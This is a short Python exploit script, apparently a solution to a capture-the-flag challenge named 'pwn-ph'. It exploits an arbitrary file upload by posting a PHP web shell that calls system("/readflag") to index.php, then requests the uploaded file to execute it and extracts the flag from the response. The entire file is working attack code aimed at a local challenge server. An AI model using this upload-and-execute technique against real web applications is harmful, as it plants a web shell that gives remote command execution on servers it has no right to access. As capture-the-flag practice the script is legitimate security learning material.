#!/usr/bin/env python3
import argparse
import re
import secrets
import sys
import urllib.parse
import urllib.request


PAYLOAD = b'<?php system("/readflag"); ?>'


def build_multipart(field_name: str, filename: str, content: bytes) -> tuple[str, bytes]:
    boundary = "----CodexBoundary" + secrets.token_hex(8)
    parts = [
        f"--{boundary}\r\n".encode(),
        (
            f'Content-Disposition: form-data; name="{field_name}"; '
            f'filename="{filename}"\r\n'
        ).encode(),
        b"Content-Type: application/octet-stream\r\n\r\n",
        content,
        b"\r\n",
        f"--{boundary}--\r\n".encode(),
    ]
    return boundary, b"".join(parts)


def fetch(url: str, data: bytes | None = None, headers: dict[str, str] | None = None) -> str:
    request = urllib.request.Request(url, data=data, headers=headers or {})
    with urllib.request.urlopen(request, timeout=10) as response:
        return response.read().decode("utf-8", errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit pwn-ph via arbitrary PHP upload")
    parser.add_argument(
        "base_url",
        nargs="?",
        default="http://127.0.0.1:9999/",
        help="Challenge base URL, for example http://127.0.0.1:9999/",
    )
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/") + "/"
    upload_url = urllib.parse.urljoin(base_url, "index.php")
    filename = f"up_{secrets.token_hex(4)}.php"
    shell_url = urllib.parse.urljoin(base_url, filename)

    boundary, body = build_multipart("file", filename, PAYLOAD)
    upload_response = fetch(
        upload_url,
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )

    if "文件上传成功" not in upload_response and "success" not in upload_response:
        print("[!] upload may have failed", file=sys.stderr)
        print(upload_response)
        return 1

    result = fetch(shell_url).strip()
    print(f"[+] uploaded as: {filename}")
    print(result)

    match = re.search(r"[A-Za-z0-9_]+\{[^}]+\}", result)
    return 0 if match else 1


if __name__ == "__main__":
    raise SystemExit(main())
